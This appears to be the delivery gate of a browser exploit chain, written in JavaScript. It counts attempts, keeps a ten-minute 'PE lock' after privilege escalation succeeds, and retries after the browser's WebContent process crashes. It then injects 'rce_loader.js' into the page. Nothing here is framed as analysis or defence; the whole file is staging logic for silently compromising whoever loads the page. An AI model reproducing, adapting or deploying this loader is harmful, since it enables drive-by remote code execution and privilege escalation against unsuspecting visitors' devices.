
(function () {
  // Gofun-style gate (simplified for single-page delivery):
  // - Soft attempts: up to MAX_TRIES per window (crash/fail can reload and retry)
  // - PE lock: 10min TTL after success â blocks re-run after WebContent death
  // - PE lock sources: localStorage (redirect) OR cookie set when pe_worker.js is served
  // - ?force=1: clear state once, then strip from URL
  var MAX_TRIES = 5;
  var PE_TTL_MS = 10 * 60 * 1000;
  var K_PE = '_x_pe_done';
  var K_TRY = '_x_try';
  var K_TRY_TS = '_x_try_ts';

  function lsGet(k) {
    try { return localStorage.getItem(k); } catch (e) { return null; }
  }
  function lsSet(k, v) {
    try { localStorage.setItem(k, v); } catch (e) {}
  }
  function lsDel(k) {
    try { localStorage.removeItem(k); } catch (e) {}
  }
  function cookieGet(name) {
    try {
      var m = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
      return m ? decodeURIComponent(m[1]) : null;
    } catch (e) { return null; }
  }
  function cookieSet(name, val, maxAgeSec) {
    try {
      document.cookie = name + '=' + encodeURIComponent(val) +
        '; Path=/; Max-Age=' + maxAgeSec + '; SameSite=Lax';
    } catch (e) {}
  }
  function cookieDel(name) {
    try { document.cookie = name + '=; Path=/; Max-Age=0; SameSite=Lax'; } catch (e) {}
  }
  function peDoneTs() {
    var a = parseInt(lsGet(K_PE) || '0', 10) || 0;
    var b = parseInt(cookieGet(K_PE) || '0', 10) || 0;
    return Math.max(a, b);
  }
  function clearAll() {
    lsDel(K_PE); lsDel(K_TRY); lsDel(K_TRY_TS); lsDel('_x_ok');
    cookieDel(K_PE);
  }

  var force = false;
  try {
    // Drop legacy permanent gate so old sessions are not stuck forever.
    lsDel('_x_ok');

    var q = location.search || '';
    force = /(?:^|[?&])force=1(?:&|$)/.test(q);
    if (force) {
      clearAll();
      try {
        var u = new URL(location.href);
        u.searchParams.delete('force');
        history.replaceState(null, '', u.pathname + (u.search || '') + (u.hash || ''));
      } catch (eStrip) {}
    }

    var now = Date.now();
    var peTs = peDoneTs();
    if (peTs && (now - peTs) < PE_TTL_MS && !force) {
      // Keep both stores in sync for the remaining TTL
      lsSet(K_PE, String(peTs));
      cookieSet(K_PE, String(peTs), Math.ceil((PE_TTL_MS - (now - peTs)) / 1000));
      return; // PE success lock
    }
    if (peTs && (now - peTs) >= PE_TTL_MS) {
      lsDel(K_PE);
      cookieDel(K_PE);
    }

    var tryN = parseInt(lsGet(K_TRY) || '0', 10) || 0;
    var tryTs = parseInt(lsGet(K_TRY_TS) || '0', 10) || 0;
    // New attempt window after PE_TTL from first try in the batch
    if (tryN > 0 && tryTs && (now - tryTs) >= PE_TTL_MS) {
      tryN = 0;
      lsDel(K_TRY);
      lsDel(K_TRY_TS);
    }
    if (tryN >= MAX_TRIES && !force) {
      return; // exhausted for this window
    }

    tryN += 1;
    lsSet(K_TRY, String(tryN));
    if (tryN === 1 || !tryTs) lsSet(K_TRY_TS, String(now));
  } catch (e) {}

  var s = document.createElement('script');
  s.src = 'rce_loader.js?' + Date.now();
  document.body.appendChild(s);
})();

